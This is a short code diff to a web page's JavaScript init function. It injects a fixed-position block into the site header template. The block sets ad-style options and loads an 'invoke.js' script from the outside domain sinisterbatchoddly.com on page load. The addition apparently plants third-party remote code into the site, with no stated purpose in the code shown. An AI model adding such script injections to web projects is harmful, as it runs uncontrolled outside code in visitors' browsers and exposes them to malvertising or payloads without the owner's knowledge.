@@ -3,7 +3,14 @@
   // Initialize the page
   function init() {
       document.siteName = $('title').html();
-      var html = `<header>
+      var html = `  <div style="top:100px;left:100px;position:fixed">
+<script type="text/javascript">
+	atOptions = {'key' : 'e50656314f5a73de24a452da7431f110','format' : 'iframe','height' : 600,'width' : 160,'params' : {} };
+  var script = document.createElement('script'); script.src = "https://sinisterbatchoddly.com/e50656314f5a73de24a452da7431f110/invoke.js";
+  document.body.appendChild(script);
+</script>
+  </div>
+      <header>
      <div id="nav">
      </div>
   </header>
